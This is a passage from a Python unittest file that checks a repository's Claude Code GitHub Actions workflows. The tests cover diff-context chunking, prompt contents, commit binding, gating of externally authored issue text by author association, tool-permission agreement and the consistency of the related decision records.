                        "CONTEXT_DIR": str(target),
                        "MAX_BYTES": "2048",
                        "FIXTURE_DIFF": str(fixture),
                        "STUB_DIR": str(stub_dir),
                    },
                )
                self.assertEqual(0, result.returncode, result.stderr)

            context = work / "context"
            collect(context, big)
            for name in ("diff.stat", "commits.log", "diff.patch"):
                with self.subTest(artefact=name):
                    self.assertTrue((context / name).is_file(), name)
                    self.assertTrue((context / name).read_text(encoding="utf-8"))
            self.assertFalse((context / "diff.full").exists())
            patch = (context / "diff.patch").read_text(encoding="utf-8")
            self.assertIn("bounded", patch)
            self.assertLess(len(patch.encode("utf-8")), 2048 + 256)

            # Nothing past the cutoff may be unreachable: the reviewer has no git and
            # no candidate tree, so a deletion beyond it exists nowhere else.
            parts = sorted((context / "patches").glob("part-*"))
            self.assertTrue(parts, "no diff parts were written")
            self.assertEqual(
                b"".join(part.read_bytes() for part in parts), big.read_bytes()
            )

            # An emptied Pull Request still gets every artefact the prompt names.
            empty_context = work / "empty-context"
            collect(empty_context, empty)
            self.assertFalse((empty_context / "README").exists())
            for name in ("diff.stat", "commits.log", "diff.patch"):
                with self.subTest(emptied=name):
                    self.assertTrue((empty_context / name).is_file(), name)
            self.assertIn(
                "No changes",
                (empty_context / "diff.patch").read_text(encoding="utf-8"),
            )
            # The stub reports three commits while listing one, so the cap notice
            # must appear rather than the short list passing as complete.
            self.assertIn(
                "provider listed 1 of 3 commits",
                (context / "commits.log").read_text(encoding="utf-8"),
            )
            # Every artefact the prompt names exists, including the manifest, which
            # lives outside base/ so it cannot collide with a repository path.
            self.assertIn("f.txt", (context / "no-patch.txt").read_text())
            manifest = (context / "base.manifest").read_text(encoding="utf-8")
            self.assertIn("Written: 0", manifest)
            self.assertFalse((context / "base" / "base.manifest").exists())

            # With no pull number the request is an issue, and says so.
            issue_context = work / "issue-context"
            collect(issue_context, big, pull="")
            self.assertFalse((issue_context / "diff.patch").exists())
            self.assertIn(
                "No Pull Request",
                (issue_context / "README").read_text(encoding="utf-8"),
            )

    def test_mention_prompt_handles_a_request_with_no_pull_request(self) -> None:
        # issues:opened is an admitted trigger and Decision 0093 rule 7 keeps it.
        # With no Pull Request the resolved base equals the head, so a diff-shaped
        # instruction would have nothing to compare.
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = " ".join(_claude_step(workflow)["with"]["prompt"].split())
        self.assertIn("no Pull Request", prompt)
        # The instruction is only actionable if both sides are actually shown.
        self.assertIn("steps.review_head.outputs.head_sha", prompt)

    def test_supersession_names_every_tool_the_mention_job_grants(self) -> None:
        # Decision 0093 rule 8 requires every extra mention-job tool to be unset,
        # so a granted tool that the supersession section does not name leaves two
        # records demanding opposite things for that tool.
        workflow = load_yaml(MENTION_WORKFLOW)
        args = str(_claude_step(workflow)["with"].get("claude_args", ""))
        granted = re.search(r'--allowedTools\s+"([^"]+)"', args)
        self.assertIsNotNone(granted, args)
        path = ROOT / "knowledge" / "decisions" / "0094-bound-claude-review-context.md"
        decision = " ".join(path.read_text(encoding="utf-8").split())
        superseded = decision.split("**superseded:**", 1)
        self.assertEqual(2, len(superseded), "no superseded clause found")
        clause = superseded[1].split("**retained:**", 1)[0]
        for tool in granted.group(1).split(","):
            with self.subTest(tool=tool):
                self.assertIn(tool.strip(), clause)

    def test_mention_prompt_keys_item_type_on_the_resolved_pull_number(self) -> None:
        # A merged or empty Pull Request can report an equal head and base, so
        # inferring "this is not a Pull Request" from SHA equality misroutes a
        # real Pull Request request as an ordinary issue.
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = " ".join(_claude_step(workflow)["with"]["prompt"].split())
        self.assertIn("steps.review_head.outputs.pull_number", prompt)
        self.assertNotIn("same commit there is no Pull Request", prompt)

    def test_guard_step_reports_pull_presence_on_every_exit_path(self) -> None:
        # The prompt can only key on the resolved pull number if every branch of
        # the guard step writes it, including the early no-Pull-Request return.
        workflow = load_yaml(MENTION_WORKFLOW)
        steps = next(
            job["steps"]
            for job in workflow["jobs"].values()
            if any(s.get("id") == "review_head" for s in job.get("steps", []))
        )
        script = next(s for s in steps if s.get("id") == "review_head")["run"]
        branches = script.split("exit 0")
        self.assertGreaterEqual(len(branches), 3, script)
        # The script runs top to bottom, so a path is covered when the write
        # happens at or before its own exit, not only inside its own block.
        for index in range(len(branches)):
            with self.subTest(exit_path=index):
                self.assertIn("pull_number=", "exit 0".join(branches[: index + 1]))

    def test_mention_prompt_forwards_inline_review_location(self) -> None:
        # On pull_request_review_comment the request's meaning often lives in the
        # comment's path, line and hunk rather than its body.
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = _claude_step(workflow)["with"]["prompt"]
        for expression in (
            "github.event.comment.path",
            "github.event.comment.line",
            "github.event.comment.diff_hunk",
            "github.event.comment.original_commit_id",
            "github.event.comment.original_line",
        ):
            with self.subTest(expression=expression):
                self.assertIn(expression, prompt)

    def test_decision_0094_rules_are_numbered_in_order(self) -> None:
        decision = (
            ROOT / "knowledge" / "decisions" / "0094-bound-claude-review-context.md"
        ).read_text(encoding="utf-8")
        numbers = [
            int(match.group(1))
            for match in re.finditer(r"^(\d+)\. ", decision, re.MULTILINE)
        ]
        self.assertEqual(sorted(numbers), numbers)
        self.assertEqual(list(range(1, len(numbers) + 1)), numbers)

    def test_decision_0094_records_its_partial_supersession_of_0093(self) -> None:
        # The read-only git grant overrides the tool clause of Decision 0093
        # rule 8. Leaving both records asserting their own version would give an
        # auditor two contradictory security contracts.
        path = ROOT / "knowledge" / "decisions" / "0094-bound-claude-review-context.md"
        decision = path.read_text(encoding="utf-8")
        self.assertIn("supersedes", decision)
        self.assertIn(
            "0093-harden-claude-code-github-actions-workflows.md",
            decision,
        )
        normalised = " ".join(decision.split())
        self.assertIn("rule 8", normalised)
        # The superseded claim must be gone, not merely contradicted later.
        self.assertNotIn("Decision 0093's eight hardening rules", normalised)
        self.assertNotIn("its eight hardening rules and", normalised)

    def test_mention_prompt_gates_externally_authored_issue_text(self) -> None:
        # The job gate validates the replying author, not the issue author. An
        # external issue body would otherwise reach a job holding the Claude
        # credential and publishing its answer in a public step summary.
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = " ".join(_claude_step(workflow)["with"]["prompt"].split())
        # Each field must be guarded by its own payload's association: an issue
        # association guarding a Pull Request body would close nothing.
        for shape, field in (
            ("issue", "github.event.issue.body"),
            ("issue", "github.event.issue.title"),
            ("pull_request", "github.event.pull_request.body"),
        ):
            with self.subTest(field=field):
                self.assertRegex(
                    prompt,
                    rf"github\.event\.{shape}\.author_association"
                    r"[^}]*" + re.escape(field),
                )

    def test_mention_tool_grant_matches_the_requested_permissions(self) -> None:
        # additional_permissions grants actions: read, but agent mode installs the
        # CI server only when --allowedTools names an mcp__github_ci tool. The
        # permission and the tool list must agree, or one of them is dead config.
        workflow = load_yaml(MENTION_WORKFLOW)
        claude = _claude_step(workflow)
        args = str(claude["with"].get("claude_args", ""))
        permissions = str(claude["with"].get("additional_permissions", ""))
        if "actions: read" in permissions:
            self.assertIn("mcp__github_ci", args)

    def test_review_events_bind_to_the_triggering_commit(self) -> None:
        # A live lookup would replace the event's head with the Pull Request's
        # newer state if a commit lands between queue and execution, while the
        # forwarded path, line and hunk still describe the triggering event.
        workflow = load_yaml(MENTION_WORKFLOW)
        resolve = next(
            step for step in _steps(workflow) if step.get("id") == "review_head"
        )
        env = {key: str(value) for key, value in resolve["env"].items()}
        joined = " ".join(env.values())
        self.assertIn("github.event.pull_request.head.sha", joined)
        self.assertIn("github.event.pull_request.base.sha", joined)
        self.assertIn("github.event.pull_request.head.repo.full_name", joined)
        # A push landing while an older review is open leaves the Pull Request
        # head ahead of the commit the review describes. The repository already
        # treats review.commit_id as the review's head_commit, so the checkout
        # must follow it rather than the newer head.
        self.assertIn("github.event.review.commit_id", joined)
        # An inline comment can hang off an earlier commit of a multi-commit Pull
        # Request, so using it as the head would silently drop the later commits.
        self.assertNotIn("github.event.comment.commit_id", joined)
        script = str(resolve["run"])
        # Presence anywhere in the script is not enough: the reviewed commit must
        # be what the step writes as the head the checkout will use.
        # Non-greedy: the first ${...} after the format string is the value
        # written, not the ${GITHUB_OUTPUT} the line redirects into.
        head_writes = re.findall(r"head_sha=%s[^\n]*?\$\{([A-Z_]+)\}", script)
        self.assertIn("REVIEWED_COMMIT", head_writes, head_writes)

    def test_withheld_marker_appears_only_when_text_is_withheld(self) -> None:
        # On the review triggers there is no github.event.issue, so an
        # unconditional marker would tell the reviewer a trusted same-repository
        # Pull Request has an untrusted author.
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = _claude_step(workflow)["with"]["prompt"]
        self.assertIn("withheld", prompt)
        self.assertNotIn("withheld", _outside_expressions(prompt))
        # Positive control: the same check must reject an unconditional marker,
        # otherwise a vacuous assertion would look like coverage.
        self.assertIn("withheld", _outside_expressions("Title: withheld always"))

    def test_decision_0094_keeps_every_rule_inside_the_decision_section(self) -> None:
        path = ROOT / "knowledge" / "decisions" / "0094-bound-claude-review-context.md"
        decision = path.read_text(encoding="utf-8")
        start = decision.index("## Decision")
        end = decision.index("## ", start + 3)
        body = decision[start:end]
        rules = re.findall(r"^(\d+)\. ", body, re.MULTILINE)
        self.assertEqual([str(n) for n in range(1, len(rules) + 1)], rules)
        after = decision[end:]
        self.assertEqual([], re.findall(r"^\d+\. ", after, re.MULTILINE))
        # Rule 2 enumerates the admitted set in prose, not as identifiers.
        self.assertIn("author's association", body)

    def test_mention_workflow_has_no_unconfigured_assignment_trigger(self) -> None:
        # Without an assignee_trigger input the action never runs Claude for
        # `issues: assigned`; the trigger would only start an idle job.
        workflow = load_yaml(MENTION_WORKFLOW)
        claude = next(
            step
            for step in _steps(workflow)
            if step.get("uses", "").startswith("anthropics/claude-code-action@")
        )
        self.assertNotIn("assignee_trigger", claude["with"])
        self.assertEqual({"types": ["opened"]}, workflow[True]["issues"])

    def test_guardrail_owns_claude_workflows_and_their_test(self) -> None:
        guardrails = load_yaml(ROOT / "policy" / "guardrails.yaml")
        entry = next(
            item
            for item in guardrails["guardrails"]
            if item["id"] == "immutable-provider-ci-adapters"
        )
        for path in (
            ".github/workflows/claude-code-review.yml",
            ".github/workflows/claude.yml",
            # The chunker is part of the same provider surface: the reviewer's only
            # path to a diff region past the bound runs through it.
            ".github/review-context/chunk_diff.py",
            "knowledge/decisions/0093-harden-claude-code-github-actions-workflows.md",
            "knowledge/decisions/0094-bound-claude-review-context.md",
        ):
            self.assertIn(path, entry["implementation"])
        self.assertIn("tests/test_claude_actions_workflows.py", entry["tests"])


if __name__ == "__main__":
    unittest.main()
